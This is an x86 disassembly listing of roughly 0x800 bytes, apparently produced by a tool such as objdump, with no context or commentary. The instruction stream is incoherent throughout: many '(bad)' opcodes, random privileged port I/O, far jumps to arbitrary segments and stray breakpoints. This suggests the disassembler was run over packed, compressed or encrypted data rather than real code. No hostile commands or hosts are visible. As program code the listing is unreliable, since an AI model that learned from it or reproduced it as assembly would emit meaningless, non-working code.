  4251d8:	cmc    
  4251d9:	fcomip st,st(5)
  4251db:	fldenv [ebp+0x1b]
  4251de:	retf   
  4251df:	gs inc ebp
  4251e1:	pop    edi
  4251e2:	add    ebx,eax
  4251e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251e5:	dec    ebx
  4251e6:	jl     0x42517c
  4251e8:	inc    ebx
  4251e9:	cld    
  4251ea:	or     al,0xbc
  4251ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251ed:	div    edx
  4251ef:	retf   0x5192
  4251f2:	jne    0x425251
  4251f4:	ja     0x4251e3
  4251f6:	jl     0x425263
  4251f8:	pop    es
  4251f9:	and    edi,esp
  4251fb:	daa    
  4251fc:	push   0x5b357811
  425201:	xchg   edi,eax
  425202:	xchg   esi,eax
  425203:	sub    dh,BYTE PTR [esi]
  425205:	fbld   TBYTE PTR [ecx]
  425207:	cmc    
  425208:	mov    bl,BYTE PTR [edx-0x1bf90030]
  42520e:	cld    
  42520f:	jo     0x42521e
  425211:	mov    bh,0xe3
  425213:	rcr    BYTE PTR [esi+edx*2],cl
  425216:	sub    ecx,eax
  425218:	dec    eax
  425219:	or     DWORD PTR [esi],eax
  42521b:	loop   0x42521e
  42521d:	push   ecx
  42521e:	icebp  
  42521f:	adc    ebx,ebp
  425221:	sar    DWORD PTR [esp+ebx*8+0x7c396d36],0x7d
  425229:	fbstp  TBYTE PTR [esp+ebx*1+0x219088f7]
  425230:	or     ah,BYTE PTR [edi+0x35]
  425233:	and    eax,0x50c4e90e
  425238:	jmp    0x42524e
  42523a:	sahf   
  42523b:	mov    ebx,0xc7d6c968
  425240:	mov    eax,ds:0x3361dc73
  425245:	repnz xchg ebx,eax
  425247:	shl    DWORD PTR [edx+0x2f24fd06],0xa4
  42524e:	xor    bh,BYTE PTR [edx-0x37d2412f]
  425254:	sbb    BYTE PTR [eax],0x4
  425257:	ret    
  425258:	jl     0x4252b3
  42525a:	push   ecx
  42525b:	aam    0xeb
  42525d:	xchg   esp,eax
  42525e:	pop    ss
  42525f:	sub    al,BYTE PTR [ebx+0xdd77f52]
  425265:	inc    edi
  425266:	xchg   ecx,eax
  425267:	enter  0x73ab,0xdb
  42526b:	inc    eax
  42526c:	mov    bl,0x95
  42526e:	pop    ecx
  42526f:	jl     0x425253
  425271:	pop    eax
  425272:	add    BYTE PTR [esi-0x6f01d907],bh
  425278:	mov    al,0xfc
  42527a:	xor    edi,DWORD PTR [edi]
  42527c:	int3   
  42527d:	fstp   st(4)
  42527f:	dec    esp
  425280:	aaa    
  425281:	fcomip st,st(1)
  425283:	(bad)  
  425285:	scas   al,BYTE PTR es:[edi]
  425286:	mov    eax,DWORD PTR [edx+0x39fcacf4]
  42528c:	xchg   esi,eax
  42528d:	mov    ebp,DWORD PTR [esi+esi*1-0x37f4ce19]
  425294:	dec    edi
  425295:	(bad)  
  425296:	xchg   edi,eax
  425297:	lahf   
  425298:	jmp    0xcc6a:0xebc157ef
  42529f:	xchg   BYTE PTR [edi-0x158bb25],al
  4252a5:	loopne 0x42531b
  4252a7:	jecxz  0x425278
  4252a9:	pop    ebx
  4252aa:	imul   ebp,DWORD PTR [eax+0x62975ed6],0xffffffeb
  4252b1:	loopne 0x425309
  4252b3:	mov    eax,ds:0x37e9333e
  4252b8:	sbb    dh,BYTE PTR ds:0x390ccfa7
  4252be:	xor    eax,0xebe52b02
  4252c3:	adc    eax,0xffd786a
  4252c8:	pop    esp
  4252c9:	or     BYTE PTR [ebp+0x5b03df8a],ch
  4252cf:	fisttp WORD PTR [edi-0x1b4ffe3f]
  4252d5:	pop    ds
  4252d6:	outs   dx,DWORD PTR ds:[esi]
  4252d7:	pop    ebx
  4252d8:	mov    al,0x49
  4252da:	or     eax,0x8c15dd5e
  4252df:	dec    eax
  4252e0:	push   ebp
  4252e1:	jge    0x425302
  4252e3:	sub    al,0x0
  4252e5:	jp     0x425328
  4252e7:	enter  0x7fa9,0x3d
  4252eb:	out    0x97,al
  4252ed:	js     0x42536d
  4252ef:	scas   eax,DWORD PTR es:[edi]
  4252f0:	fwait
  4252f1:	and    ebp,edi
  4252f3:	jns    0x4252b3
  4252f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252f6:	cs in  eax,dx
  4252f8:	adc    BYTE PTR [edx+0x32cac7e3],ch
  4252fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252ff:	xor    DWORD PTR [edx],0xead0329a
  425305:	mov    ebp,0xd10d3de5
  42530a:	mov    ebp,0xb56553f8
  42530f:	enter  0xc11,0x8c
  425313:	out    0x4d,al
  425315:	xor    ah,ah
  425317:	fwait
  425318:	loop   0x4252f7
  42531a:	ror    eax,0x79
  42531d:	xor    DWORD PTR [ecx-0xe43ec88],edx
  425323:	enter  0x19ab,0x85
  425327:	clc    
  425328:	addr16 loopne 0x425314
  42532b:	(bad)  
  42532d:	mov    edi,0x50b240fc
  425332:	cmp    ebx,DWORD PTR [ecx-0x381a6adb]
  425338:	retf   0xb793
  42533b:	or     BYTE PTR [ebx],bh
  42533d:	mov    bl,0xbd
  42533f:	mov    ebx,0x854427eb
  425344:	jmp    0x6ddf:0xb1fa90d9
  42534b:	jge    0x4253a4
  42534d:	ds push ecx
  42534f:	(bad)  
  425350:	jne    0x4252e9
  425352:	cld    
  425353:	fucomp st(7)
  425355:	or     ecx,DWORD PTR [eax]
  425357:	aad    0x89
  425359:	loopne 0x425350
  42535b:	and    BYTE PTR [edi],ch
  42535d:	shr    ah,cl
  42535f:	(bad)  
  425360:	stos   BYTE PTR es:[edi],al
  425361:	dec    ebx
  425362:	pop    eax
  425363:	sub    eax,0xfa5b5f2
  425368:	test   BYTE PTR [edx],0x61
  42536b:	xchg   esi,eax
  42536c:	jmp    0x4253bb
  42536e:	dec    edx
  42536f:	mov    ebp,0xc845b062
  425374:	mov    edi,0x61dca2ff
  425379:	jge    0x4253a3
  42537b:	jns    0x425368
  42537d:	addr16 (bad) 
  42537f:	sbb    dl,BYTE PTR ds:0x9f00f91
  425385:	fild   QWORD PTR [ebx-0x18a1c35f]
  42538b:	xor    eax,0xa2e63cfd
  425390:	fsubr  QWORD PTR [edx-0x2f]
  425393:	push   esi
  425394:	stos   DWORD PTR es:[edi],eax
  425395:	lock inc esi
  425397:	xor    edi,DWORD PTR [esi-0x2737eb3d]
  42539d:	mov    cs,WORD PTR [ebp-0x1d554aa4]
  4253a3:	inc    esp
  4253a4:	jmp    0x4253d9
  4253a6:	jo     0x425415
  4253a8:	and    DWORD PTR [edi-0x20ed86a9],eax
  4253ae:	sub    edi,0xffffff89
  4253b1:	sti    
  4253b2:	mov    esi,0xfd150155
  4253b7:	lods   eax,DWORD PTR ds:[esi]
  4253b8:	pop    ds
  4253b9:	aas    
  4253ba:	adc    al,0xfc
  4253bc:	sub    ch,BYTE PTR [edx+0x24]
  4253bf:	enter  0x5d6d,0xa6
  4253c3:	jecxz  0x425421
  4253c5:	xor    DWORD PTR [ecx+ecx*4],edi
  4253c8:	out    dx,al
  4253c9:	ins    BYTE PTR es:[edi],dx
  4253ca:	outs   dx,DWORD PTR ds:[esi]
  4253cb:	call   0xa11551c7
  4253d0:	int3   
  4253d1:	mov    edi,0xdf52bede
  4253d6:	xchg   DWORD PTR ds:0x6c5479b,ecx
  4253dc:	or     DWORD PTR [ecx],0x6df445fd
  4253e2:	pop    esp
  4253e3:	outs   dx,DWORD PTR ds:[esi]
  4253e4:	mov    ch,0x1f
  4253e6:	pop    ds
  4253e7:	enter  0xfd78,0x9
  4253eb:	out    0xe5,al
  4253ed:	aam    0x2c
  4253ef:	sti    
  4253f0:	xchg   esi,eax
  4253f1:	mov    edi,0x3f5d3fc
  4253f6:	xchg   edx,eax
  4253f7:	cmp    eax,0xcb181ccd
  4253fc:	or     BYTE PTR [ecx+0x25],dl
  4253ff:	iret   
  425400:	ss inc ebx
  425402:	jne    0x42541e
  425404:	pushf  
  425405:	call   0xf3c3:0x690a04fc
  42540c:	push   0xa1de539e
  425411:	jbe    0x425490
  425413:	mov    ch,0x66
  425415:	repz into 
  425417:	mov    esi,ds
  425419:	push   es
  42541a:	and    ebp,edi
  42541c:	jmp    0x4253b4
  42541e:	and    esi,esi
  425420:	adc    bh,ah
  425422:	pop    esi
  425423:	mov    ecx,0xf862dfca
  425428:	not    ch
  42542a:	add    BYTE PTR [eax+0x2444ce37],cl
  425430:	(bad)  
  425431:	fcomip st,st(7)
  425433:	xor    BYTE PTR [edx+0x7a2e892c],bl
  425439:	fistp  WORD PTR [ecx]
  42543b:	iret   
  42543c:	jo     0x42547f
  42543e:	dec    ebp
  42543f:	stos   BYTE PTR es:[edi],al
  425440:	cmp    al,0xdc
  425442:	ficomp DWORD PTR [ecx+0x7bfd38d9]
  425448:	and    BYTE PTR cs:[esi+0x75df0668],ah
  42544f:	add    BYTE PTR [edi+0x71f871d5],dl
  425455:	mov    eax,0x1996d2f2
  42545a:	(bad)  
  42545b:	call   0x9e7a6984
  425460:	pop    esi
  425461:	fcomip st,st(4)
  425463:	push   edx
  425464:	jg     0x4254dd
  425466:	mov    ebx,DWORD PTR ds:0x13fcb56a
  42546c:	cmp    cl,BYTE PTR [ecx+0x2a]
  42546f:	mov    esi,ss
  425471:	pusha  
  425472:	inc    ebp
  425473:	enter  0xa335,0xc6
  425477:	inc    ebx
  425478:	loop   0x425436
  42547a:	xchg   ecx,eax
  42547b:	je     0x425468
  42547d:	xchg   DWORD PTR [esi+0x53],ebp
  425480:	jp     0x4254f9
  425482:	lds    esi,FWORD PTR [edx-0x4d]
  425485:	fistp  WORD PTR ds:0x45961756
  42548b:	jmp    0xa22c:0xdbfd6226
  425492:	add    al,0x42
  425494:	mov    edx,0x21b4adcc
  425499:	or     DWORD PTR [eax+ebp*2-0x15],0x3b
  42549e:	dec    esi
  42549f:	cdq    
  4254a0:	xchg   ebx,eax
  4254a1:	add    bl,dh
  4254a3:	pusha  
  4254a4:	jmp    0x4254e8
  4254a6:	jp     0x4254d1
  4254a8:	cmp    eax,DWORD PTR [ecx-0x6b]
  4254ab:	or     al,0xfd
  4254ad:	fistp  WORD PTR [edi+0x5d]
  4254b0:	jns    0x42546b
  4254b2:	add    BYTE PTR [ecx-0x1c],ch
  4254b5:	clc    
  4254b6:	cld    
  4254b7:	push   edx
  4254b8:	mov    WORD PTR [eax],cs
  4254ba:	scas   al,BYTE PTR es:[edi]
  4254bb:	fdivr  DWORD PTR [edx+0x1f]
  4254be:	mov    eax,0x9fb5bcc8
  4254c3:	sub    BYTE PTR [ecx-0x149afb5a],0x15
  4254ca:	push   edi
  4254cb:	call   0xae17122b
  4254d0:	rcr    edi,1
  4254d2:	and    esp,DWORD PTR [ecx-0x158067cc]
  4254d8:	fstp   DWORD PTR [ebx-0x6ca27701]
  4254de:	pshufw mm0,mm5,0x37
  4254e2:	hlt    
  4254e3:	add    BYTE PTR [eax+0x47],al
  4254e6:	imul   eax,ebp,0x9
  4254e9:	or     al,0x88
  4254eb:	js     0x4254dc
  4254ed:	pop    edi
  4254ee:	jne    0x42554e
  4254f0:	sub    DWORD PTR [ecx],ebx
  4254f2:	movsx  edi,WORD PTR [ecx]
  4254f5:	dec    ebx
  4254f6:	std    
  4254f7:	push   ebp
  4254f8:	sahf   
  4254f9:	mov    ch,0x1
  4254fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254fc:	fbstp  TBYTE PTR ds:[ebp-0x3878bfb3]
  425503:	xchg   esp,eax
  425504:	add    bl,BYTE PTR [edx-0x13ded104]
  42550a:	std    
  42550b:	popf   
  42550c:	(bad)  
  42550d:	arpl   WORD PTR [eax+ecx*8+0x4f],di
  425511:	adc    dl,BYTE PTR ds:0x65d1990a
  425517:	dec    ebp
  425518:	jmp    0x4254ae
  42551a:	dec    esp
  42551b:	hlt    
  42551c:	test   DWORD PTR [ecx+0x5d],edi
  42551f:	and    esi,DWORD PTR [ecx-0x21]
  425522:	dec    edi
  425523:	push   ebx
  425524:	xchg   esi,eax
  425525:	(bad)
  425528:	ja     0x4254e7
  42552a:	inc    esp
  42552b:	adc    bl,BYTE PTR [ebx-0x21]
  42552e:	test   al,0x13
  425530:	mov    esp,gs
  425532:	shl    BYTE PTR [edi-0xe],1
  425535:	fbld   TBYTE PTR [eax+0x655037bf]
  42553b:	lods   eax,DWORD PTR ds:[esi]
  42553c:	inc    edi
  42553d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42553e:	cld    
  42553f:	popa   
  425540:	ins    BYTE PTR es:[edi],dx
  425541:	push   es
  425542:	jb     0x4254da
  425544:	test   al,0xbb
  425546:	jne    0x425510
  425548:	test   eax,0x93e9817b
  42554d:	sbb    eax,DWORD PTR [ecx]
  42554f:	lods   eax,DWORD PTR ds:[esi]
  425550:	jmp    0x425507
  425552:	mov    cl,BYTE PTR [edi]
  425554:	mov    eax,0x84dd640
  425559:	fistp  QWORD PTR [eax-0xcf6889]
  42555f:	sub    ah,BYTE PTR [ecx+0x2c0bfd3b]
  425565:	dec    ecx
  425566:	push   ds
  425567:	ins    DWORD PTR es:[edi],dx
  425568:	stos   BYTE PTR es:[edi],al
  425569:	rcl    BYTE PTR [edi-0x69],cl
  42556c:	fisttp DWORD PTR [ebx+0x1a]
  42556f:	retf   
  425570:	rcl    DWORD PTR [eax],cl
  425572:	cwde   
  425573:	mov    al,ds:0x98cefe2
  425578:	and    DWORD PTR [ebp+0x2991b4fc],edx
  42557e:	stos   BYTE PTR es:[edi],al
  42557f:	imul   ebp,DWORD PTR [edx+0xf],0x5d2d33c
  425586:	jns    0x425536
  425588:	jmp    0x4255a0
  42558a:	mov    esi,0xfd0accc9
  42558f:	in     eax,0x30
  425591:	clc    
  425592:	je     0x425556
  425594:	lock retf 0xcae5
  425598:	shrd   DWORD PTR [ecx+esi*8+0x6f],eax,0xec
  42559e:	cld    
  42559f:	mov    bh,0x94
  4255a1:	adc    esi,DWORD PTR [ebp+edx*1-0x31ca9fb6]
  4255a8:	push   ds
  4255a9:	into   
  4255aa:	xor    eax,0x32860b08
  4255af:	pop    ss
  4255b0:	or     al,0x2c
  4255b2:	cli    
  4255b3:	mov    es,WORD PTR [ebp+0x68]
  4255b6:	repz icebp 
  4255b8:	sub    al,0x49
  4255ba:	fwait
  4255bb:	inc    eax
  4255bc:	pop    es
  4255bd:	cdq    
  4255be:	or     al,0xc8
  4255c0:	sbb    edx,ebx
  4255c2:	pop    ecx
  4255c3:	jns    0x4255f6
  4255c5:	popa   
  4255c6:	or     edx,DWORD PTR [eax]
  4255c8:	in     al,dx
  4255c9:	imul   esp,edi,0xc4de3913
  4255cf:	pop    ebp
  4255d0:	pushf  
  4255d1:	leave  
  4255d2:	int3   
  4255d3:	mov    eax,ds:0x3b1705b0
  4255d8:	out    0x9c,al
  4255da:	push   esi
  4255db:	jl     0x4255eb
  4255dd:	or     eax,0x7cab83f3
  4255e2:	jbe    0x425658
  4255e4:	jmp    0x4255df
  4255e6:	sbb    eax,edi
  4255e8:	shl    DWORD PTR [esp+eiz*4],0xd5
  4255ec:	inc    ebp
  4255ed:	fild   WORD PTR [edi+edi*8]
  4255f0:	leave  
  4255f1:	adc    al,0x42
  4255f3:	or     dl,BYTE PTR [edi+0x4d]
  4255f6:	out    0x8,eax
  4255f8:	pop    ss
  4255f9:	in     eax,dx
  4255fa:	lods   al,BYTE PTR ds:[esi]
  4255fb:	retf   0x4de8
  4255fe:	push   0xef582bc9
  425603:	xor    cl,BYTE PTR [esi-0x21]
  425606:	and    DWORD PTR [ebx+0x75e00caa],0x74fd20bc
  425610:	das    
  425611:	pop    ss
  425612:	pop    edx
  425613:	scas   eax,DWORD PTR es:[edi]
  425614:	mov    dh,0x8b
  425616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425617:	enter  0xbc06,0xf4
  42561b:	out    0xc5,eax
  42561d:	je     0x4255cc
  42561f:	sbb    ebx,ebp
  425621:	push   cs
  425622:	or     DWORD PTR ds:0x25f80b1a,eax
  425628:	inc    ecx
  425629:	dec    edi
  42562a:	push   ss
  42562b:	sbb    al,0x2d
  42562d:	fbstp  TBYTE PTR [esi]
  42562f:	rcl    BYTE PTR [ebx-0x15],1
  425632:	or     eax,0x873f4c
  425637:	mov    al,0xdf
  425639:	leave  
  42563a:	pop    eax
  42563b:	cmp    BYTE PTR ds:0x70dde62f,bl
  425641:	fisttp WORD PTR [ebp-0x39]
  425644:	in     eax,dx
  425645:	jo     0x425639
  425647:	fcomp  DWORD PTR [eax+0x3e]
  42564a:	std    
  42564b:	lods   al,BYTE PTR ds:[esi]
  42564c:	in     al,dx
  42564d:	rcl    DWORD PTR [edx-0x328062cc],1
  425653:	enter  0x171b,0x1d
  425657:	mov    bl,0x68
  425659:	adc    al,0x97
  42565b:	iret   
  42565c:	jmp    0x42562e
  42565e:	sub    BYTE PTR [edx],cl
  425660:	test   DWORD PTR [eax+0x58],ebp
  425663:	mov    edx,0xcb9ed2fa
  425668:	stos   DWORD PTR es:[edi],eax
  425669:	enter  0x64ce,0x35
  42566d:	push   cs
  42566e:	mov    esp,0x4d4ad88
  425673:	push   0xbcbea0eb
  425678:	mov    ebp,0x7bfeac0c
  42567d:	jmp    0x8ad:0x5f97ce52
  425684:	or     ah,dl
  425686:	loopne 0x425659
  425688:	out    0xb9,al
  42568a:	mov    eax,ds:0xbe92a94d
  42568f:	and    al,0x62
  425691:	mov    ebx,DWORD PTR [esi]
  425693:	adc    DWORD PTR [edi],esp
  425695:	imul   DWORD PTR [ebp-0x701ee631]
  42569b:	outs   dx,DWORD PTR ds:[esi]
  42569c:	or     eax,DWORD PTR [edx+0x73d09692]
  4256a2:	div    BYTE PTR [ebp+0x78]
  4256a5:	test   DWORD PTR [eax],eax
  4256a7:	dec    eax
  4256a8:	mov    bh,0x6a
  4256aa:	inc    ebp
  4256ab:	test   BYTE PTR [ecx],ch
  4256ad:	jmp    0x5c7c:0xc60ad2dd
  4256b4:	sub    eax,0x2408bb56
  4256b9:	pusha  
  4256ba:	std    
  4256bb:	fimul  DWORD PTR [eax]
  4256bd:	ror    BYTE PTR [ebp+0x59945d35],1
  4256c3:	push   ds
  4256c4:	jb     0x42569e
  4256c6:	out    0xc2,al
  4256c8:	das    
  4256c9:	idiv   DWORD PTR [ebp+0x28cf608]
  4256cf:	sbb    DWORD PTR [ebx],ecx
  4256d1:	aas    
  4256d2:	xchg   esi,eax
  4256d3:	call   0x6ffcd6c3
  4256d8:	push   cs
  4256d9:	stc    
  4256da:	dec    edi
  4256db:	call   0xd67e:0xc8614002
  4256e2:	int    0x4e
  4256e4:	jno    0x425702
  4256e6:	mov    esp,0x3f42eb30
  4256eb:	loopne 0x42568e
  4256ed:	xor    BYTE PTR [esp+ebx*4-0x5893fa34],0xee
  4256f5:	and    al,0x61
  4256f7:	in     al,0xeb
  4256f9:	add    DWORD PTR [ecx-0x30f1c5c],0x5a522d97
  425703:	adc    BYTE PTR [esi+eiz*4],dl
  425706:	and    edi,eax
  425708:	inc    ebx
  425709:	jge    0x4256cf
  42570b:	or     al,0x61
  42570d:	scas   eax,DWORD PTR es:[edi]
  42570e:	cmp    al,0x12
  425710:	add    eax,0x3daf2d9
  425715:	adc    eax,0x13fbee2e
  42571a:	jo     0x4256e5
  42571c:	cli    
  42571d:	push   cs
  42571e:	pop    es
  42571f:	ins    BYTE PTR es:[edi],dx
  425720:	dec    esi
  425721:	sub    BYTE PTR ds:0x77f0139f,bl
  425727:	ins    DWORD PTR es:[edi],dx
  425728:	xor    ebx,DWORD PTR [edi]
  42572a:	out    0xd9,al
  42572c:	inc    edx
  42572e:	cld    
  42572f:	cmp    edx,DWORD PTR [edi+0x16]
  425732:	xchg   DWORD PTR [esp+ecx*2+0x3ac8070a],ebx
  425739:	and    al,0xa3
  42573b:	in     eax,dx
  42573c:	(bad)  [eax+0x6b]
  42573f:	(bad)  
  425741:	jge    0x425716
  425743:	shr    BYTE PTR [edi],0x2f
  425746:	in     eax,dx
  425747:	call   0xe7c9:0xbb362ef6
  42574e:	mov    esp,0x6bf5e3c8
  425753:	push   esp
  425754:	xor    BYTE PTR [esi],bh
  425756:	std    
  425757:	int    0xae
  425759:	dec    edi
  42575a:	test   ebx,edx
  42575c:	js     0x425718
  42575e:	or     cl,dl
  425760:	xor    eax,0xe964865e
  425765:	ja     0x425784
  425767:	jo     0x4257ca
  425769:	sub    ch,bh
  42576b:	sbb    al,0x4d
  42576d:	cmp    DWORD PTR [esp+edx*2],esp
  425770:	xchg   esp,eax
  425771:	ds sbb cl,al
  425774:	ja     0x42573a
  425776:	pushf  
  425777:	(bad)  
  425778:	fcomp  QWORD PTR [esi]
  42577a:	and    DWORD PTR [edx+0x3314c5ed],ecx
  425780:	adc    eax,0xea4c7949
  425785:	or     BYTE PTR [eax+esi*1+0xfe1ebeb],bh
  42578c:	dec    ecx
  42578d:	fucomip st,st(0)
  42578f:	or     al,0x1c
  425791:	scas   eax,DWORD PTR es:[edi]
  425792:	inc    edx
  425793:	mov    edi,0xa42b1999
  425798:	jmp    0x425735
  42579a:	out    dx,eax
  42579b:	jl     0x4257b2
  42579d:	jl     0x425770
  42579f:	fmul   QWORD PTR [edi]
  4257a1:	loopne 0x4257b2
  4257a3:	dec    edx
  4257a4:	sbb    eax,0x2e680a69
  4257a9:	mov    bh,0x65
  4257ab:	stos   BYTE PTR es:[edi],al
  4257ac:	jmp    0x425791
  4257ae:	je     0x4257c0
  4257b0:	mov    ds:0xe5fe0690,eax
  4257b5:	fstp   DWORD PTR [edx]
  4257b7:	adc    DWORD PTR [esi-0x13ecc32c],edi
  4257bd:	aas    
  4257be:	cli    
  4257bf:	js     0x4257ac
  4257c1:	jle    0x425835
  4257c3:	push   edx
  4257c4:	fbstp  TBYTE PTR [ebx]
  4257c6:	nop
  4257c7:	in     al,0xf4
  4257c9:	push   es
  4257ca:	sub    eax,0x3ac6eb24
  4257cf:	adc    ebx,DWORD PTR [eax]
  4257d1:	sub    al,0x74
  4257d3:	or     al,0x15
  4257d5:	imul   eax,DWORD PTR [eax],0x49
  4257d8:	push   ecx
  4257d9:	setnp  BYTE PTR [ebx-0x5ec690ab]
  4257e0:	test   eax,0xb370d3df
  4257e5:	jge    0x4257ec
  4257e7:	push   es
  4257e8:	jne    0x4257e0
  4257ea:	cld    
  4257eb:	jns    0x4257a2
  4257ed:	hlt    
  4257ee:	jmp    0x99ddbc6
  4257f3:	enter  0x586a,0x78
  4257f7:	rol    DWORD PTR [esi-0x41],cl
  4257fa:	outs   dx,DWORD PTR ds:[esi]
  4257fb:	in     al,0xeb
  4257fd:	pushf  
  4257fe:	mov    dl,0x7a
  425800:	xor    al,0x8b
  425802:	aad    0xb8
  425804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425805:	fild   QWORD PTR [ebx-0x7124ac8f]
  42580b:	or     al,0x6c
  42580d:	jmp    0x9d22:0xa504d7fc
  425814:	stos   DWORD PTR es:[edi],eax
  425815:	popa   
  425816:	xlat   BYTE PTR ds:[ebx]
  425817:	mov    DWORD PTR [ecx],0x6955c3ef
  42581d:	mov    al,dl
  42581f:	or     ebp,ebx
  425821:	les    esi,FWORD PTR [ecx]
  425823:	scas   eax,DWORD PTR es:[edi]
  425824:	cmp    al,0x97
  425826:	jno    0x425866
  425828:	fcomi  st,st(0)
  42582a:	(bad)  
  42582b:	or     cl,BYTE PTR [eax+ebx*8+0x30]
  42582f:	mov    ch,0xab
  425831:	jmp    0xdc00:0xb8197537
  425838:	add    al,0xbf
  42583a:	cmp    al,0x1f
  42583c:	sub    DWORD PTR [eax+ebp*1+0x1d],eax
  425840:	inc    eax
  425841:	fist   WORD PTR [eax+0x3757243b]
  425847:	(bad)  
  425848:	push   0x7a
  42584a:	std    
  42584b:	daa    
  42584c:	jo     0x42581c
  42584e:	(bad)  
  425850:	int3   
  425851:	mov    eax,0x1a8dc897
  425856:	dec    ecx
  425857:	mov    bl,0xb3
  425859:	xchg   ebx,eax
  42585a:	loopne 0x4258ce
  42585c:	jnp    0x4257ff
  42585e:	cld    
  42585f:	or     dh,BYTE PTR [esi]
  425861:	rcl    bl,cl
  425863:	out    dx,eax
  425864:	jnp    0x42583e
  425866:	test   al,0xcb
  425868:	fidiv  DWORD PTR [eax-0x43a4cf19]
  42586e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42586f:	mov    edi,0xc4fd10ec
  425874:	dec    esi
  425875:	cmp    dl,BYTE PTR [ecx-0x3d655e0b]
  42587b:	cs or  bl,bh
  42587e:	jb     0x4258b7
  425880:	fcmovnbe st,st(1)
  425882:	add    ebp,ebp
  425884:	addr16 mov bl,0xf7
  425887:	mov    ds:0xd3318eef,al
  42588c:	mov    al,ds:0x96d28fe0
  425891:	aas    
  425892:	int    0x37
  425894:	cmp    eax,0xfc86b01
  425899:	adc    BYTE PTR gs:0xd9540042,cl
  4258a0:	inc    bl
  4258a2:	cmp    dh,ah
  4258a4:	jg     0x4258c7
  4258a6:	cmp    eax,0x470be8b7
  4258ab:	push   ebp
  4258ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258ad:	fistp  QWORD PTR [ebx]
  4258af:	mov    eax,0x49dd9df3
  4258b4:	lds    edi,FWORD PTR [ebx-0x3]
  4258b7:	pop    ebp
  4258b8:	jecxz  0x4258d7
  4258ba:	(bad)  
  4258bc:	test   al,0x65
  4258be:	ja     0x4258e5
  4258c0:	mov    esi,ecx
  4258c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258c3:	fisttp QWORD PTR [eax+0x60]
  4258c6:	std    
  4258c7:	aad    0x78
  4258c9:	jae    0x4258f1
  4258cb:	jns    0x4258a9
  4258cd:	jbe    0x4258cc
  4258cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258d0:	add    cl,dh
  4258d2:	sub    edx,0xffffffdd
  4258d5:	sbb    eax,0x6247c86f
  4258da:	xor    al,0x7
  4258dc:	adc    DWORD PTR ds:0x8bf04711,edx
  4258e2:	lods   eax,DWORD PTR ds:[esi]
  4258e3:	fwait
  4258e4:	inc    BYTE PTR [ebp-0x2015235f]
  4258ea:	retf   0x9b7e
  4258ed:	(bad)  
  4258ef:	sub    BYTE PTR [ebx],ah
  4258f1:	hlt    
  4258f2:	cld    
  4258f3:	fimul  DWORD PTR [ecx+edi*8+0x68]
  4258f7:	and    ecx,DWORD PTR [edi+ebp*1-0x264c60ca]
  4258fe:	jo     0x42589b
  425900:	adc    eax,DWORD PTR ds:0x51cc703d
  425906:	scas   eax,DWORD PTR es:[edi]
  425907:	xchg   edx,eax
  425908:	jmp    0x425960
  42590a:	fbstp  TBYTE PTR [esi+0x6e]
  42590d:	je     0x42598d
  42590f:	mov    al,ds:0x34fbdeab
  425914:	lock inc eax
  425916:	arpl   WORD PTR ds:0xedc4bf14,sp
  42591c:	in     eax,dx
  42591d:	ror    DWORD PTR [eax+0x125d93d0],cl
  425923:	popa   
  425924:	cmp    al,0xbe
  425926:	mov    cl,0x21
  425928:	daa    
  425929:	loopne 0x42597b
  42592b:	loope  0x425981
  42592d:	into   
  42592e:	cmp    DWORD PTR [edi-0x33],0x934825a8
  425935:	mov    esi,0x501df006
  42593a:	std    
  42593b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42593c:	jmp    DWORD PTR [edi+0x471b95c]
  425942:	cmc    
  425943:	mov    esi,0x8a06490
  425948:	mov    ebx,0x9c814ff7
  42594d:	nop
  42594e:	add    BYTE PTR [ebp-0x4f4ce743],al
  425954:	out    0x47,al
  425956:	pop    esp
  425957:	call   0xcb1e29f9
  42595c:	arpl   dx,si
  42595e:	popa   
  42595f:	fld    TBYTE PTR [eax+edi*1]
  425962:	test   al,0xec
  425964:	sbb    ebp,DWORD PTR [ecx+0x4cbeb974]
  42596a:	popa   
  42596b:	dec    esp
  42596c:	jmp    0x425940
  42596e:	scas   al,BYTE PTR es:[edi]
  42596f:	shl    esp,cl
  425971:	mov    al,0xfb
  425973:	sti    
  425974:	jmp    0x425950
  425976:	inc    ecx
  425977:	jbe    0x425957
  425979:	add    eax,0xd9a2d5f1
  42597e:	ds cmp BYTE PTR es:[edi-0x21],bh
  425983:	cmp    eax,0x633cbdb1
  425988:	push   edi
  425989:	es std 
  42598b:	in     al,dx
  42598c:	cdq    
  42598d:	mov    ch,0x2a
  42598f:	mov    dh,0x40
  425991:	(bad)  
  425992:	adc    eax,0x502cefc8
  425997:	mov    edx,0xa23c25f2
  42599c:	test   BYTE PTR [edi],0x2f
  42599f:	shr    bl,1
  4259a1:	lahf   
  4259a2:	mov    al,0xc0
  4259a4:	fcomp  DWORD PTR [eax-0x39a63690]
  4259aa:	in     eax,0x64
  4259ac:	es pop esp
  4259ae:	stc    
  4259af:	test   DWORD PTR [ecx-0x2c],0x236516fc
  4259b6:	jp     0x425a20
  4259b8:	dec    edi
  4259b9:	inc    ecx
  4259ba:	imul   ecx,eax,0xffffff8d
  4259bd:	or     DWORD PTR [ebx+0x529767da],eax
  4259c3:	stos   BYTE PTR es:[edi],al
  4259c4:	and    al,0x3f
  4259c6:	les    ebx,FWORD PTR [edi-0x14]
  4259c9:	aaa    
  4259ca:	jle    0x425953
  4259cc:	mov    dh,0x17
  4259ce:	fistp  QWORD PTR [eax]
  4259d0:	femms  
  4259d2:	(bad)  
  4259d3:	mov    esi,0x48c29c12
  4259d8:	aam    0x46
  4259da:	das    
  4259db:	aad    0x92
  4259dd:	loopne 0x4259db
  4259df:	test   eax,0x6996e5a8
  4259e4:	xchg   edi,eax
  4259e5:	into   
  4259e6:	xor    al,0xc8
